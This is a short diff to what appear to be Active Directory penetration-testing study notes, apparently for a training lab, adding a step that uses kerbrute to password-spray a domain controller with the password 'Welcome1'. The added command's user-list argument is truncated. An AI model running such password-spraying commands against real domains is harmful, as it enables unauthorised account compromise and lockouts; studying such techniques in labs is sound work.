@@ -29,4 +29,9 @@ import-module .\PowerView.ps1
 Get-DomainPolicy
 ```
 
-After that, we can start attempting to actually perform password spray
+After that, we can start attempting to actually perform password spray:
+
+-Using Kerbrute for password spraying:
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 <userli  Welcome1
+```
